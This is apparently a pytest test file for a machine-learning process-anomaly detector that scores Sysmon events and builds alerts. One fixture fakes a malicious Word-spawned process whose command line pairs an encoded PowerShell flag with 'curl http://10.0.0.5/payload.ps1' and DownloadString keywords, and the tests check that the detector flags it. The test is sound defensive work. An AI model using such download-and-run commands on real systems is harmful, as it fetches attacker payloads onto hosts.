import copy
import json
import sys

import pytest

from detection.ml.alerts import build_process_anomaly_alert
from detection.ml.baseline import ProcessBaselineError, load_process_baseline
from detection.ml.features import ProcessFeatureExtractionError, extract_process_features
from detection.ml.scorer import DEFAULT_THRESHOLD, score_process_features
from detection.rules.native.alert_indexer import AlertIndexResult, AlertIndexingError
from normalization.sysmon.process_create_normalizer import normalize_sysmon_event_1
from scripts.ml import run_process_anomaly_detection


FIXED_CREATED_AT = "2026-06-17T10:00:00Z"


def normalized_fixture_event() -> dict:
    xml = run_process_anomaly_detection.FIXTURE_PATH.read_text(encoding="utf-8")
    return normalize_sysmon_event_1(xml)


def suspicious_event() -> dict:
    event = copy.deepcopy(normalized_fixture_event())
    command_line = (
        r"C:\Users\Public\evil.exe -EncodedCommand SQBFAFgA "
        "curl http://10.0.0.5/payload.ps1 "
        "DownloadString WebClient "
        "--one --two --three --four --five --six --seven --eight --nine"
    )
    event["event"]["created"] = "2026-06-08T23:30:00.000Z"
    event["process"]["name"] = "evil.exe"
    event["process"]["executable"] = r"C:\Users\Public\evil.exe"
    event["process"]["command_line"] = command_line
    event["process"]["args"] = command_line.split()
    event["process"]["parent"]["name"] = "winword.exe"
    event["process"]["parent"]["executable"] = r"C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE"
    return event


def test_feature_extraction_reads_process_name() -> None:
    features = extract_process_features(normalized_fixture_event())

    assert features["process_name"] == "cmd.exe"


def test_feature_extraction_reads_executable() -> None:
    features = extract_process_features(normalized_fixture_event())

    assert features["process_executable"] == r"C:\Windows\System32\cmd.exe"


def test_feature_extraction_reads_parent_name() -> None:
    features = extract_process_features(normalized_fixture_event())

    assert features["parent_process_name"] == "powershell.exe"


def test_feature_extraction_computes_command_line_length() -> None:
    event = normalized_fixture_event()
    features = extract_process_features(event)

    assert features["command_line_length"] == len(event["process"]["command_line"])


def test_feature_extraction_computes_args_count() -> None:
    features = extract_process_features(normalized_fixture_event())

    assert features["args_count"] == 3


def test_feature_extraction_computes_executable_directory_depth() -> None:
    features = extract_process_features(normalized_fixture_event())

    assert features["executable_directory_depth"] == 2


def test_feature_extraction_detects_encoded_command_flags() -> None:
    features = extract_process_features(suspicious_event())

    assert features["has_encoded_command"] is True


def test_feature_extraction_detects_network_download_keywords() -> None:
    features = extract_process_features(suspicious_event())

    assert features["has_network_tool_flag"] is True
    assert "curl" in features["matched_network_keywords"]


def test_feature_extraction_parses_hour_of_day() -> None:
    features = extract_process_features(normalized_fixture_event())

    assert features["hour_of_day"] == 2


def test_feature_extraction_handles_missing_optional_host_user_fields() -> None:
    event = normalized_fixture_event()
    event.pop("host")
    event.pop("user")

    features = extract_process_features(event)

    assert features["process_name"] == "cmd.exe"


def test_feature_extraction_rejects_missing_required_event_shape() -> None:
    event = normalized_fixture_event()
    event.pop("event")

    with pytest.raises(ProcessFeatureExtractionError, match="event metadata"):
        extract_process_features(event)


def test_feature_extraction_rejects_missing_process_shape() -> None:
    event = normalized_fixture_event()
    event.pop("process")

    with pytest.raises(ProcessFeatureExtractionError, match="process object"):
        extract_process_features(event)


def test_baseline_loader_validates_required_fields() -> None:
    baseline = load_process_baseline()

    assert "cmd.exe" in baseline["common_process_names"]
    assert baseline["max_command_line_length"] > 0


def test_baseline_loader_rejects_missing_common_process_names(tmp_path) -> None:
    baseline = load_process_baseline()
    baseline.pop("common_process_names")
    path = tmp_path / "baseline.json"
    path.write_text(json.dumps(baseline), encoding="utf-8")

    with pytest.raises(ProcessBaselineError, match="common_process_names"):
        load_process_baseline(path)


def test_baseline_loader_rejects_invalid_hour_values(tmp_path) -> None:
    baseline = load_process_baseline()
    baseline["normal_hours"] = [0, 24]
    path = tmp_path / "baseline.json"
    path.write_text(json.dumps(baseline), encoding="utf-8")

    with pytest.raises(ProcessBaselineError, match="normal_hours"):
        load_process_baseline(path)


def test_benign_fixture_defaults_to_no_anomaly_or_low_score() -> None:
    baseline = load_process_baseline()
    features = extract_process_features(normalized_fixture_event())
    score = score_process_features(features, baseline)

    assert score["score"] < DEFAULT_THRESHOLD
    assert score["is_anomaly"] is False


def test_crafted_suspicious_event_produces_anomaly_score() -> None:
    baseline = load_process_baseline()
    features = extract_process_features(suspicious_event())
    score = score_process_features(features, baseline)

    assert score["score"] >= DEFAULT_THRESHOLD
    assert score["is_anomaly"] is True
    assert score["reasons"]


def test_crafted_suspicious_event_produces_one_alert() -> None:
    alert = _build_suspicious_alert()

    assert alert is not None
    assert alert["detection"]["engine"] == "ml-anomaly"


def test_alert_id_starts_with_ml_anomaly_prefix() -> None:
    alert = _build_suspicious_alert()

    assert alert["alert"]["id"].startswith("det-ml-anomaly-process-")


def test_alert_id_is_deterministic_for_same_event_features_score_reasons() -> None:
    event = suspicious_event()
    baseline = load_process_baseline()
    features = extract_process_features(event)
    score = score_process_features(features, baseline)

    first = build_process_anomaly_alert(event, features, score, created_at=FIXED_CREATED_AT)
    second = build_process_anomaly_alert(event, features, score, created_at="2026-06-17T11:00:00Z")

    assert first["alert"]["id"] == second["alert"]["id"]


def test_alert_includes_ml_score_features_and_reasons() -> None:
    alert = _build_suspicious_alert()

    assert alert["ml"]["score"] >= DEFAULT_THRESHOLD
    assert alert["ml"]["features"]["process_name"] == "evil.exe"
    assert alert["ml"]["reasons"]


def test_alert_preserves_selected_event_process_host_and_user_fields() -> None:
    event = suspicious_event()
    baseline = load_process_baseline()
    features = extract_process_features(event)
    score = score_process_features(features, baseline)

    alert = build_process_anomaly_alert(event, features, score, created_at=FIXED_CREATED_AT)

    assert alert["event"]["dataset"] == "windows.sysmon_operational"
    assert alert["event"]["code"] == 1
    assert alert["process"]["name"] == "evil.exe"
    assert alert["host"] == event["host"]
    assert alert["user"] == event["user"]


def test_input_fixture_command_runs_without_elasticsearch(monkeypatch: pytest.MonkeyPatch) -> None:
    def fail_index_alerts(*_: object, **__: object) -> list[AlertIndexResult]:
        raise AssertionError("indexer should not be called")

    monkeypatch.setattr(run_process_anomaly_detection, "index_alerts", fail_index_alerts)

    result = run_process_anomaly_detection.run_process_anomaly_detection(input_mode="fixture")

    assert result["event_count"] == 1
    assert result["alert_count"] == 0


def test_input_json_event_path_runs_on_one_normalized_event(tmp_path) -> None:
    path = tmp_path / "event.json"
    path.write_text(json.dumps(suspicious_event()), encoding="utf-8")

    result = run_process_anomaly_detection.run_process_anomaly_detection(input_mode="json", event_path=path)

    assert result["event_count"] == 1
    assert result["alert_count"] == 1


def test_write_alerts_calls_existing_native_indexer(monkeypatch: pytest.MonkeyPatch, tmp_path) -> None:
    calls = []
    path = tmp_path / "event.json"
    path.write_text(json.dumps(suspicious_event()), encoding="utf-8")

    def fake_index_alerts(alerts: list[dict], config: object, *, index_date: str | None = None) -> list[AlertIndexResult]:
        calls.append({"alerts": alerts, "config": config, "index_date": index_date})
        return [
            AlertIndexResult(
                index="edr-alerts-native-2026.06.17",
                document_id=alerts[0]["alert"]["id"],
                result="created",
                status=201,
            )
        ]

    monkeypatch.setattr(run_process_anomaly_detection, "index_alerts", fake_index_alerts)

    result = run_process_anomaly_detection.run_process_anomaly_detection(
        input_mode="json",
        event_path=path,
        write_alerts=True,
    )

    assert len(calls) == 1
    assert calls[0]["alerts"][0]["detection"]["engine"] == "ml-anomaly"
    assert result["indexed_alert_count"] == 1


def test_without_write_alerts_indexer_is_not_called(monkeypatch: pytest.MonkeyPatch, tmp_path) -> None:
    path = tmp_path / "event.json"
    path.write_text(json.dumps(suspicious_event()), encoding="utf-8")

    def fail_index_alerts(*_: object, **__: object) -> list[AlertIndexResult]:
        raise AssertionError("indexer should not be called")

    monkeypatch.setattr(run_process_anomaly_detection, "index_alerts", fail_index_alerts)

    result = run_process_anomaly_detection.run_process_anomaly_detection(input_mode="json", event_path=path)

    assert result["indexed_alert_count"] == 0


def test_indexing_errors_map_to_exit_code_2(monkeypatch: pytest.MonkeyPatch, tmp_path, capsys) -> None:
    path = tmp_path / "event.json"
    path.write_text(json.dumps(suspicious_event()), encoding="utf-8")

    def fake_index_alerts(*_: object, **__: object) -> list[AlertIndexResult]:
        raise AlertIndexingError("indexing failed")

    monkeypatch.setattr(run_process_anomaly_detection, "index_alerts", fake_index_alerts)

    exit_code = run_process_anomaly_detection.main(
        ["--input", "json", "--event-path", str(path), "--write-alerts"]
    )

    captured = capsys.readouterr()
    assert exit_code == 2
    assert "Operational failure" in captured.err


def test_tests_do_not_import_or_call_soar_or_containment_modules() -> None:
    before = set(sys.modules)

    run_process_anomaly_detection.run_process_anomaly_detection(input_mode="fixture")

    imported = set(sys.modules) - before
    assert not any(name.startswith("response.soar") for name in imported)
    assert not any(name.startswith("response.containment") for name in imported)


def _build_suspicious_alert() -> dict:
    event = suspicious_event()
    baseline = load_process_baseline()
    features = extract_process_features(event)
    score = score_process_features(features, baseline)
    alert = build_process_anomaly_alert(event, features, score, created_at=FIXED_CREATED_AT)
    assert alert is not None
    return alert
